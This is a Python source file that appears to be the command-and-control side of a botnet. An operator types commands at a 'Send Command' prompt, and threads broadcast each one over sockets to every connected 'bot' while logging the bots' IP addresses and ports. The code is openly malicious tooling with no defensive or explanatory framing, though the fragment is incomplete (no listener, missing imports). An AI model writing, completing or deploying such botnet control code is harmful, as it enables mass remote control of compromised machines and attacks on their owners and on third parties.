import threading
import time
import sys
import os

prefix = "Send Command -> "

sock_threads = []
client_map = {}

class Bot(threading.Thread, object):
    def __init__(self, qv2):
        super().__init__()
        self.q = qv2

    sys.stdout.write("[!] Server initialized.\n")
    def run(self):
        while True:
            send_buffer = f"{input(prefix)}"
            if not send_buffer:
                pass
            elif send_buffer == "exit":
                for _ in sock_threads:
                    time.sleep(0.1)
                    self.q.put(send_buffer)

                os._exit(0)
            else:
                sys.stdout.write(f"[+] Sending: {send_buffer} to all bots...\n")
                for _ in sock_threads:
                    time.sleep(0.1)
                    self.q.put(send_buffer)

class BotHandler(threading.Thread, object):
    def __init__(self, client, client_addr, qv):
        super().__init__()
        self.client = client
        self.client_addr = client_addr
        
        self.ip = client_addr[0]
        self.port = client_addr[1]

        self.q = qv

    def run(self):
        bot_name = threading.current_thread().getName()
        sys.stdout.write(f"\n[*] Bot {self.ip}:{self.port} connected with thread ID: {bot_name}.\n{prefix}")

        client_map[bot_name] = self.client_addr
        while True:
            recv_buffer = self.q.get()
            try:
                self.client.send(recv_buffer.encode("utf-8"))
            except Exception as ex:
                sys.stderr.write(f"{ex}\n")
                break
